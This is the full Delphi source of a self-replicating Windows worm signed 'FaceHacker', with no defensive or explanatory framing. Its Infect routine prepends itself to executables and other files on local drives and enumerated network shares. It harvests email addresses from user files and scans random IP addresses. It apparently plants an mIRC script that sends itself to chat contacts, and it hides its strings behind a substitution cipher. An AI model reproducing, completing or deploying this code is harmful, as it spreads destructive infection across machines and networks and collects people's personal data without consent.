   unit Unit1;

   interface
   Uses windows, Winsock;

   type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle;
       FindData: TWin32FindData;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

     TAttachmentHeader = record
       MagicNumber: cardinal;
       CRC: cardinal;
       Size: int64;
       IsStub: boolean;
       FileName: array[0..MAX_PATH] of char;
     end;
     PAttachmentHeader = ^TAttachmentHeader;

   function SpawnProgram(Filename: string): boolean;
   procedure FileClose(Handle: Integer);
   function FileCreate(const FileName: string): Integer;
   function FileOpen(const FileName: string; Mode: LongWord): Integer;
   function FileExists(const FileName: string): Boolean;
   function GetTmpPath: string;
   Function GetHeader(Filew:String):PAttachmentHeader;
   Function AllocMem(Size: Cardinal): Pointer;
   Function StrLCopy(Dest: PChar; Const Source: PChar; MaxLen: Cardinal): PChar; Assembler;
   Function StrPas(Const Str: PChar): String;
   Function FileSize(FileName: String): Int64;
   Procedure Infect(File1:String);
   Function FindMatchingFile(Var F: TSearchRec): Integer;
   Function FindNext(Var F: TSearchRec): Integer;
   Function FindFirst(Const Path: String; Attr: Integer; Var  F: TSearchRec): Integer;
   Procedure FindClose(Var F: TSearchRec);
   Function Enumeration(aResource:PNetResource):String;
   procedure FFile(D, Name, SearchName : String);
   Function NoFound(S:String):Boolean;
   Procedure Release;
   function LowerCase(const S: string): string;
   procedure gonetwork;
   function ResolveIPToHostname(IP_Address : String): String;
   function StrToInt(S: string): integer;
   function IntToStr(X: integer): string;
   Procedure FindHost;
   Function SysDir:String;
   function Trim(const S: string): string;
   FUNCTION StrToIP(HostName:STRING) : STRING;
   function Decode(str:string):string;

   var                             // "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 "-------------
     a1  : array[0..63]  of integer = (97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 32, 124);
                                   // "Km0CeTv9Ln2DgUwNq5GiXzbQs6IkYAcRt8Jl1BdSu MoZEfVx7Hp3FhWraPy4Oj"
     a2  : array[0..63]  of integer = (75, 109, 48, 67, 101, 84, 118, 57, 76, 110, 50, 68, 103, 85, 119, 124, 78, 113, 53, 71, 105, 88, 122, 98, 81, 115, 54, 73, 107, 89, 65, 99, 82, 116, 56, 74, 108, 49, 66, 100, 83, 117, 32, 77, 111, 90, 69, 102, 86, 120, 55, 72, 112, 51, 70, 104, 87, 114, 97, 80, 121, 52, 79, 106);
     msg : Array[0..293] of integer = (45, 45, 45, 45, 45, 13, 10, 70, 97, 99, 101, 72, 97, 99, 107, 101, 114, 13, 10, 45, 45, 45, 45, 45, 13, 10, 67, 114, 101, 97, 116, 101, 100, 32, 84, 111, 32, 67, 97, 117, 115, 101, 32, 84, 111, 116, 97, 108, 32, 67, 104, 97, 111, 115, 32, 65, 114, 111, 117, 110, 100, 32, 84, 104,
                                       101, 32, 87, 111, 114, 108, 100, 46, 32, 13, 10, 67, 97, 110, 32, 89, 111, 117, 32, 68, 101, 99, 114,121, 112, 116, 32, 77, 121, 32, 87, 111, 114, 109, 32, 63, 32, 13, 10, 68, 111, 32, 89, 111, 117, 32,75, 110, 111, 119, 32, 87, 104, 97, 116, 32, 73, 116, 32, 68, 111, 101, 115,
                                       32, 63, 32, 13, 10, 89, 111, 117, 32, 75, 110, 111, 119, 32, 89, 111, 117, 32, 67, 97, 110, 116, 32, 83, 116, 111, 112, 32, 80, 69, 45, 87, 111, 114, 109, 115, 46, 32, 13, 10, 89, 111, 117, 32, 75, 110, 111, 119, 32, 89, 111, 117, 32, 67, 97, 110, 116, 32, 84, 114, 97, 99, 107,
                                       32, 80, 69, 45, 87, 111, 114, 109, 115, 46, 13, 10, 89, 111, 117, 32, 75, 110, 111, 119, 32, 89, 111, 117, 32, 83, 117, 99, 107, 46, 32, 87, 101, 32, 65, 114, 101, 32, 71, 111, 110, 110, 97, 32, 87, 105, 110, 32, 84, 104, 101, 32, 86, 105, 114, 117, 115, 32, 87, 97, 114, 33, 13,
                                       10, 80, 114, 101, 112, 97, 114, 101, 32, 84, 111, 32, 71, 101, 116, 32, 83, 116, 114, 105, 107, 101, 100, 32, 66, 121, 32, 77, 111, 114, 101, 32, 86, 101, 114, 115, 105, 111, 110, 115, 46);

     ABC1,ABC2 : String;

     Host_Thread : Integer;
     THREAD      : Integer;
     LAST_IP     : String;

     Mails       : String;

   const
     fmOpenRead                          = $0000;
     fmOpenWrite                         = $0001;
     fmOpenReadWrite                     = $0002;
     fmShareCompat                       = $0000;
     fmShareExclusive                    = $0010;
     fmShareDenyWrite                    = $0020;
     fmShareDenyRead                     = $0030;
     fmShareDenyNone                     = $0040;
     FILE_ATTRIBUTE_READONLY             = $00000001;
     FILE_ATTRIBUTE_HIDDEN               = $00000002;
     FILE_ATTRIBUTE_SYSTEM               = $00000004;
     FILE_ATTRIBUTE_VOLUMEID             = $00000008;
     FILE_ATTRIBUTE_ARCHIVE              = $00000020;
     FILE_ATTRIBUTE_DIRECTORY            = $00000010;
     FILE_ATTRIBUTE_ANYFILE              = $0000003F;

   implementation

   function Decode(str:string):string;
   var
   i,j:integer;
   ch:string;
   c:boolean;
   begin
   result:='';
   for i:=1 to length(str) do begin
    ch := copy(str,i,1);
    c:=false;
    for j:=1 to length(ABC2) do begin
     if copy(ABC2,j,1)=ch then begin
      result:=result+copy(ABC1,j,1);
      c := true;
     end;
    end;
     if not c then result := result + ch;
   end;
   end;

   FUNCTION StrToIP(HostName:STRING) : STRING;
   TYPE
     TAPInAddr = ARRAY [0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     I          : Integer;
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(pChar(HostName));
       IF HostEntPtr<>NIL THEN BEGIN
         pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
         I:=0;
         WHILE pptr^[I]<>NIL DO BEGIN
           Result:=(inet_ntoa(pptr^[I]^));
           Inc(I);
         END;
       END;
     EXCEPT
     END;
     WSACleanUp();
   END;

   function Trim(const S: string): string;
   var
    I, L: Integer;
   begin
    L := Length(S);
    I := 1;
    while (I <= L) and (S[I] <= decode('O')) do Inc(I);
    if I > L then Result := '' else
     begin
      while S[L] <= decode('O') do Dec(L);
      Result := Copy(S, I, L - I + 1);
     end;
   end;

   Function SysDir:String;
   Var
    S:Array[0..255]Of Char;
   Begin
    GetSystemDirectory(@S,SizeOf(S));
    Result := S;
    Result := Result + '\';
   End;

   Procedure FindHost;
   Var
    F      :TextFile;
    IP     :String;
    Host   :String;
    I      :Integer;
   Label Again;
   Begin
    Host_Thread := 0;
    I := Thread;
    While I > 0 do begin
    Again:
     Randomize;
     IP := IntToStr(Random(255));
     If IP = decode('3p') Then Goto Again;
     If IP = decode('3FP') Then Goto Again;
     If IP = decode('a') Then Goto Again;
     If IP = decode('Frr') Then Goto Again;
     IP := IP + '.' + IntToStr(Random(255));
     If IP = decode('34F.3ay') Then Goto Again;
     If IP = decode('3PF.3a') Then Goto Again;
     If IP = decode('Frr.Frr') Then Goto Again;
     IP := IP + '.' + IntToStr(Random(255));
     IP := IP + '.' + IntToStr(Random(255));
     If IP <> LAST_IP Then
      LAST_IP := IP
     Else
      Goto Again;
     Host := ResolveIPToHostName(IP);
     If Host = decode('qe5eqXeC-giDGL0K5G-qKUve-dSZ-CeDevKGeC.ebKg|De.0wg') Then Goto Again;
     If Host <> '' Then Begin
      AssignFile(F, SysDir+decode('TK0e.9K2'));
      If FileExists(SysDir+decode('TK0e.9K2')) Then
       Append(F)
      Else
       ReWrite(F);
      While Length(IP) < 15 do
       IP := IP + decode('O');
      Host := Copy(Host,pos('.',host)+1,length(Host));
      While Length(HOST) < 70 do
       HOST := decode('O') + Host;
      WriteLn(F, IP +decode('O->O')+host);
      CloseFile(F);
      Dec(I);
     End;
    End;
   End;

   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   function StrToInt(S: string): integer;
   var
    V, Code: integer;
   begin
    Val(S, V, Code);
    Result := V;
   end;

   function ResolveIPToHostname(IP_Address : String): String;
   var
     Host: PHostEnt;
     Addr: Integer;
     dat: TWSAData;
   begin
     WSAStartup($0101, dat);
     try
       Addr := inet_addr(PChar(IP_Address));
       Host := gethostbyaddr(@Addr, 4, PF_INET);
       if Host <> nil then
          Result := Host.h_name
       else
          Result := '';
     finally
       WSACleanup;
     end;
   end;

   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= decode('6')) and (Ch <= decode('H')) then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Procedure Release;
   var
     buffer: array[0..$ffff] of byte;
     fSource, fTemp: THandle;
     BytesRead, BytesWritten: cardinal;
     NeededSize, BufferRead: cardinal;
     tmppath, fname, tname: string;
     Header: TAttachmentHeader;
   begin
     TmpPath := GetTmpPath;
     Try
       FSource := FileOpen(ParamStr(0), fmOpenRead or fmShareDenyWrite);
       If FSource = THandle(-1) Then
       Begin
        Exit;
        Halt(0);
       End;
       Try
         SetFilePointer(FSource, GetFileSize(FSource, NIL) - SizeOf(TAttachmentHeader), NIL, FILE_BEGIN);
         ReadFile(FSource, Header, SizeOf(Header), BytesRead, NIL);
         if (Header.MagicNumber <> $FEEDBEEF) or (BytesRead <> SizeOf(Header)) Then
         Begin
           Exit;
           FileClose(FSource);
           Halt(0);
         End;
         SetFilePointer(FSource, Header.Size, NIL, FILE_BEGIN);
         While (SetFilePointer(FSource, 0, NIL, FILE_CURRENT) <= (GetFileSize(FSource, NIL) - SizeOf(Header))) Do
         Begin
           ReadFile(FSource, Header, SizeOf(Header), BytesRead, NIL);
           If Header.MagicNumber <> $FEEDBEEF Then
           Begin
            Exit;
            Halt(0);
           End;
           FName := Header.FileName;
           Repeat
             Str(GetTickCount, TName);
             Fname := decode('Gg|')+tname+decode('.ebe');
             Sleep(0);
           Until Not FileExists(TmpPath+Fname);
           fTemp := FileCreate(TmpPath + Fname);
           NeededSize := Header.Size;
           Repeat
             If NeededSize > SizeOf(Buffer) Then
               BufferRead := SizeOf(Buffer)
             Else
               BufferRead := NeededSize;
             ReadFile(FSource, Buffer, BufferRead, BytesRead, NIL);
             WriteFile(FTemp, Buffer, BytesRead, BytesWritten, NIL);
             Dec(NeededSize, BytesRead);
           Until (BytesRead <> BufferRead) Or (NeededSize = 0);
           FileClose(FTemp);
           If (NeededSize <> 0) Or (Not SpawnProgram(TmpPath + Fname)) Then
           Begin
             FileClose(FSource);
             Halt(0);
           End;
         End;
         FileClose(FSource);
       Finally
       End;
     Finally
     End;
   End;

   Function NoFound(S:String):Boolean;
   Var
    F:TextFile;
    S1,S2,FS:String;
   Begin
    AssignFIle(F, S);
    Reset(F);
    Read(F, S1);
    ReadLn(F, S2);
    FS := S1;
    While Not Eof(F) Do Begin
     Read(F, S1);
     ReadLn(F, S2);
     FS := FS + S1;
    End;
    CloseFile(F);
    If Pos(decode('c6kAt6klAM'), FS)> 0 Then Result := False Else
    Result := True;
   End;

   Function Grabmail(Filename:string):String;
   Var
    F:Textfile;
    L1,L2,Text:string;
    MAIL:String;
    H,E,i, A:Integer;
    ABC,ABC2:STRING;
   Label again;
   begin
    ABC:=decode('Km0CeTv9Ln2DgUw|Nq5GiXzbQs_-6IkYAcRt8Jl1BdSu MoZEfVx7H');
    ABC2:=decode('Km0CeTv9Ln2DgUw|Nq5GiXzbQs_-6IkYAcRt8Jl1BdSu MoZEfVx7H.');
    if filesize(filename) > 5000 then exit;
    CopyFile(Pchar(Filename),pchar(Filename+'_'),false);
    sleep(300);
    AssignFile(F,Filename+'_');
    try
     Reset(F);
    except
     exit;
    end;
    Read(F,L1);
    ReadLN(F,L2);
    Text:=L1;
    While NOt EOF(F) DO BEGIN
     Read(F,L1);
     ReadLN(F,L2);
     Text:=Text+decode('j')+L1;
    END;
    Closefile(F);
    Deletefile(pchar(Filename+'_'));
    sleep(200);
    if copy(text,1,2)=decode('BH') then exit;
    text:=decode('j')+text+decode('j');
    result:='';

    AGAIN:
    IF pos('@',Text)>0 then begin
     A:=Pos('@',Text)-1;
     if a =0 then a := 1;
     L1 := copy(text,a,1);
     L2 := copy(text,a+2,1);
     H := pos(L1,abc);
     E := pos(L2,abc2);
     if (H = 0) or (e=0) then begin
      text:=copy(text,a+1,length(text));
      goto again;
     end;
     While POS(Copy(TExt,a,1),ABC)>0 do begin
      A:=A-1;
     end;
     a := a +1;
     Mail := copy(Text,a,length(text));
     Mail := COpy(Mail,1,pos('@',mail)+2);
     i:= pos(MAIL,text)+length(mail);
     While pos(copy(mail,length(mail),1),ABC2)>0 do begin
      Mail := mail+copy(text,i,1);
      i:=i+1;
     end;
     if POS(copy(mail,length(mail),1),ABC2)=0 then Mail:=copy(mail,1,length(mail)-1);
     Result := Result+Mail+#13#10;
     Text:=copy(text,pos(mail,text)+length(mail),length(text));
     goto AGAIN;
    end;

   end;

   procedure FFile(D, Name, SearchName : String);
   var
     SR: TSearchRec;
     FF: String;
     irc:TextFile;
   begin
     If D[Length(D)] <> '\' then D := D + '\';

     If FindFirst(D + decode('*.*'), FILE_ATTRIBUTE_DIRECTORY, SR) = 0 then
       Repeat
         If ((Sr.Attr and FILE_ATTRIBUTE_DIRECTORY) = FILE_ATTRIBUTE_DIRECTORY) and (SR.Name[1] <> '.') then
           FFile(D + SR.Name + '\', Name, SearchName)
         Else Begin

           If pos(decode('gLq0'), LowerCase(SR.Name))>0 then begin
            AssignFile(Irc, D+decode('o0qL|G.LUL'));
            If Not FileExists(D+decode('o0qL|G.LUL')) Then
             Rewrite(Irc)
            Else
             Append(Irc);
             WriteLn(Irc, decode('SUO*:JS8d:*:{'));
             WriteLn(Irc, decode('.C00O5eUCO$UL02O')+paramstr(0));
             WriteLn(Irc, '}');
             CloseFile(Irc);
           end;
           if FileSize(d+sr.name)<100000 then begin
            if lowercase(copy(sr.name, length(sr.name)-3, 4)) = decode('.GbG') then Mails := Mails + GrabMail(D+sr.name);
            if lowercase(copy(sr.name, length(sr.name)-3, 4)) = decode('.9Gg') then Mails := Mails + GrabMail(D+sr.name);
            if lowercase(copy(sr.name, length(sr.name)-3, 4)) = decode('.Cw0') then Mails := Mails + GrabMail(D+sr.name);
            if lowercase(copy(sr.name, length(sr.name)-3, 4)) = decode('.UTw') then Mails := Mails + GrabMail(D+sr.name);
            if lowercase(copy(sr.name, length(sr.name)-3, 4)) = decode('9GgD') then Mails := Mails + GrabMail(D+sr.name);
            if lowercase(copy(sr.name, length(sr.name)-3, 4)) = decode('.Xm5') then Mails := Mails + GrabMail(D+sr.name);
            if lowercase(copy(sr.name, length(sr.name)-3, 4)) = decode('.egD') then Mails := Mails + GrabMail(D+sr.name);
           end;
           FF:= copy(SR.NAME, length(SR.NAME)-3, 4);
           if ff = SearchName then
           if (filesize(D+SR.Name)<800000) and (NoFound(D+SR.Name)) then Begin
            Infect(D+SR.Name);
           End;

         end;
       Until (FindNext(SR) <> 0);
     FindClose(SR);
   end;

   procedure gonetwork;
   var
    Dom:String;
   begin
    Dom := Enumeration(nil);
    while(Dom)<>'' do begin
     try
      FFile(Copy(Dom,1,pos(#13#10,Dom)-1),'*',decode('.ebe'));
      FFile(Copy(Dom,1,pos(#13#10,Dom)-1),'*',decode('.0wg'));
      FFile(Copy(Dom,1,pos(#13#10,Dom)-1),'*',decode('.50q'));
      FFile(Copy(Dom,1,pos(#13#10,Dom)-1),'*',decode('.|LT'));
      FFile(Copy(Dom,1,pos(#13#10,Dom)-1),'*',decode('.0gC'));
      FFile(Copy(Dom,1,pos(#13#10,Dom)-1),'*',decode('.mKG'));
      FFile(Copy(Dom,1,pos(#13#10,Dom)-1),'*',decode('.w0b'));
      Dom := copy(Dom,pos(#13#10,Dom)+2,length(Dom));
     except
      Dom := copy(Dom,pos(#13#10,Dom)+2,length(Dom));
     end;
    end;
   end;

   Function Enumeration(aResource:PNetResource):String;
   var
      aHandle: THandle;
      k, BufferSize: DWORD;
      Buffer: array[0..1023] of TNetResource;
      i: Integer;
   begin
      WNetOpenEnum(2,0,0,aResource,aHandle);
      k:=1024;
      BufferSize:=SizeOf(Buffer);
      while WNetEnumResource(aHandle,k,@Buffer,BufferSize)=0 do
      for i:=0 to k-1 do
    begin
       if Buffer[i].dwDisplayType=RESOURCEDISPLAYTYPE_SERVER then
     Result := Result + copy(pchar(Buffer[i].lpRemoteName),3,MAX_PATH) + #13#10 ;
       if Buffer[i].dwUsage>0 then
     Enumeration(@Buffer[i])
    end;
      WNetCloseEnum(aHandle);
   end;

   Function FindMatchingFile(Var F: TSearchRec): Integer;
   Var
    LocalFileTime: TFileTime;
   Begin
    With F Do
    Begin
     While FindData.dwFileAttributes And ExcludeAttr <> 0 Do
      If Not FindNextFile(FindHandle, FindData) Then
       Begin
        Result := GetLastError;
        Exit;
       End;
      FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
      FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
      LongRec(Time).Lo);
      Size := FindData.nFileSizeLow;
      Attr := FindData.dwFileAttributes;
      Name := FindData.cFileName;
     End;
    Result := 0;
   End;

   Procedure FindClose(Var F: TSearchRec);
   Begin
   If F.FindHandle <> INVALID_HANDLE_VALUE Then
    Begin
     Windows.FindClose(F.FindHandle);
     F.FindHandle := INVALID_HANDLE_VALUE;
    End;
   End;

   Function FindFirst(Const Path: String; Attr: Integer; Var  F: TSearchRec): Integer;
   Const
    faSpecial = FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM or FILE_ATTRIBUTE_VOLUMEID or FILE_ATTRIBUTE_DIRECTORY;
   Begin
    F.ExcludeAttr := Not Attr And faSpecial;
    F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
    If F.FindHandle <> INVALID_HANDLE_VALUE Then Begin
     Result := FindMatchingFile(F);
     If Result <> 0 Then FindClose(F);
    End Else
     Result := GetLastError;
   End;

   Function FindNext(Var F: TSearchRec): Integer;
   Begin
    If FindNextFile(F.FindHandle, F.FindData) Then
     Result := FindMatchingFile(F)
    Else
     Result := GetLastError;
   End;

   Procedure Infect(File1:String);
   VAR
     Virus, Output         : THandle;
     Header                : TAttachmentHeader;
     itemHeader            : PAttachmentHeader;
     fName                 : String;
     My_Path               :String;
     stubSize              : Int64;
     Buffer                :Array[0..2048] of Char;
     BytesRead,
     BytesWritten          :LongWord;

   Begin
    ZeroMemory(@Buffer, SizeOf(Buffer));

    My_Path := File1+'_';
    CopyFile(pChar(Paramstr(0)),pChar(My_Path),False);

    OutPut := CreateFile(pChar(File1+'-'), GENERIC_WRITE, FILE_SHARE_WRITE,
              NIL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);

    itemHeader := GetHeader(My_Path);
    Fname := StrPas(@itemHeader.Filename);

    Virus := CreateFile(pChar(fName), GENERIC_READ, FILE_SHARE_READ,
              NIL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    SetFilePointer(Output, 0, nil, FILE_END);
    Repeat
     ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
     WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
    Until BytesWritten = 0;
    CloseHandle(Virus);
    itemHeader := GetHeader(File1);
    fName := StrPas(@itemHeader.FileName);

    Header.MagicNumber := $FEEDBEEF;
    Header.CRC := 0;
    Header.Size := FileSize(File1);
    Header.IsStub := False;
    Header.FileName := itemHeader.FileName;

    WriteFile(OutPut, Header, Sizeof(Header), BytesWritten, NIL);

    Virus := CreateFile(pChar(fName), GENERIC_READ, FILE_SHARE_READ,
              NIL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    SetFilePointer(Output, 0, nil, FILE_END);
    Repeat
     ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
     WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
    Until BytesWritten = 0;
    CloseHandle(Virus);

    itemHeader := GetHeader(My_Path);

    Fname := StrPas(@itemHeader.Filename);
    StubSize := FileSize(My_Path);

    Header.MagicNumber:= $FEEDBEEF;
    Header.CRC:= 0;
    Header.Size:= stubSize;
    Header.IsStub:= true;

    fillChar(Header.FileName, MAX_PATH+1, 0);

    WriteFile(OutPut, Header, Sizeof(Header), BytesWritten, NIL);
    ZeroMemory(@Buffer,SizeOf(Buffer));
    Buffer[0] := 'F';
    Buffer[1] := 'A';
    Buffer[2] := 'C';
    Buffer[3] := 'E';
    Buffer[4] := 'H';
    Buffer[5] := 'A';
    Buffer[6] := 'C';
    Buffer[7] := 'K';
    Buffer[8] := 'E';
    Buffer[9] := 'R';
    WriteFile(OutPut, Buffer, 10, BytesWritten, NIL);
    CloseHandle(OutPut);
    DeleteFile(pChar(File1));
    CopyFile(pChar(File1+'-'),pChar(File1),False);
    DeleteFile(pChar(File1+'-'));
    DeleteFile(pChar(File1+'_'));

   End;

   Function AllocMem(Size: Cardinal): Pointer;
   Begin
     GetMem(Result, Size);
     FillChar(Result^, Size, 0);
   End;

   Function StrPas(Const Str: PChar): String;
   Begin
     Result := Str;
   End;

   Function StrLCopy(Dest: PChar; Const Source: PChar; MaxLen: Cardinal): PChar; Assembler;
   Asm
           PUSH    EDI
           PUSH    ESI
           PUSH    EBX
           MOV     ESI,EAX
           MOV     EDI,EDX
           MOV     EBX,ECX
           XOR     AL,AL
           TEST    ECX,ECX
           JZ      @@1
           REPNE   SCASB
           JNE     @@1
           INC     ECX
   @@1:    SUB     EBX,ECX
           MOV     EDI,ESI
           MOV     ESI,EDX
           MOV     EDX,EDI
           MOV     ECX,EBX
           SHR     ECX,2
           REP     MOVSD
           MOV     ECX,EBX
           AND     ECX,3
           REP     MOVSB
           STOSB
           MOV     EAX,EDX
           POP     EBX
           POP     ESI
           POP     EDI
   End;

   Function FileSize(FileName: String): Int64;
   Var
     H: THandle;
     FData: TWin32FindData;
   Begin
     Result:= -1;

     H:= FindFirstFile(PChar(FileName), FData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindClose(H);
       Result:= Int64(FData.nFileSizeHigh) Shl 32 + FData.nFileSizeLow;
     End;
   End;

   Function GetHeader(Filew:String):PAttachmentHeader;
   Var
     Header: PAttachmentHeader;
   Begin
     Header:= AllocMem(SizeOf(TAttachmentHeader));
     StrLCopy(@Header.Filename, PChar(Filew), MAX_PATH);
     Header.Size:= FileSize(Filew);
     Header.IsStub:= False;
     Result := Header;
   End;

   function SpawnProgram(Filename: string): boolean;
     function ErrorString(ErrorCode: integer): string;
     var
       buffer: array[0..1024] of char;
     begin
       FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nil, ErrorCode, 0, @buffer, sizeof(buffer)-1, nil);
       result:= string(@buffer);
     end;
   var
     si: TStartupInfo;
     pi: TProcessInformation;
   begin
     FillChar(si, sizeof(si), 0);
     si.cb:= sizeof(si);
     si.dwFlags:= STARTF_USESHOWWINDOW;
     si.wShowWindow:= SW_SHOWDEFAULT;
     if not CreateProcessA(nil, PChar(Filename), nil, nil, false, 0, nil, nil, si, pi) then
     begin
       result:= false;
       Exit;
       Halt(0);
     end
     else
       result:= true;
   end;

   function GetTmpPath: string;
   var
     buffer: array[0..MAX_PATH] of char;
   begin
     result:= '';
     if GetTempPathA(MAX_PATH, buffer) <> 0 then
     begin
       result:= String(PChar(@buffer));
       if result[length(result)] <> '\' then
         result:= result + '\';
     end;
   end;

   function FileExists(const FileName: string): Boolean;
   var
     lpFindFileData: TWin32FindData;
     hFile: Cardinal;
   begin
     hFile := FindFirstFile(PChar(FileName), lpFindFileData);
     if hFile <> INVALID_HANDLE_VALUE then
     begin
       result := True;
       Windows.FindClose(hFile)
     end
     else
       result := False;
   end;

   function FileOpen(const FileName: string; Mode: LongWord): Integer;
   const
     AccessMode: array[0..2] of LongWord = (
       GENERIC_READ,
       GENERIC_WRITE,
       GENERIC_READ or GENERIC_WRITE);
     ShareMode: array[0..4] of LongWord = (
       0,
       0,
       FILE_SHARE_READ,
       FILE_SHARE_WRITE,
       FILE_SHARE_READ or FILE_SHARE_WRITE);
   begin
     Result := Integer(CreateFileA(PChar(FileName), AccessMode[Mode and 3],
       ShareMode[(Mode and $F0) shr 4], nil, OPEN_EXISTING,
       FILE_ATTRIBUTE_NORMAL, 0));
   end;

   function FileCreate(const FileName: string): Integer;
   begin
     Result := Integer(CreateFileA(PChar(FileName), GENERIC_READ or GENERIC_WRITE,
       0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0));
   end;

   procedure FileClose(Handle: Integer);
   begin
     CloseHandle(THandle(Handle));
   end;

   end.
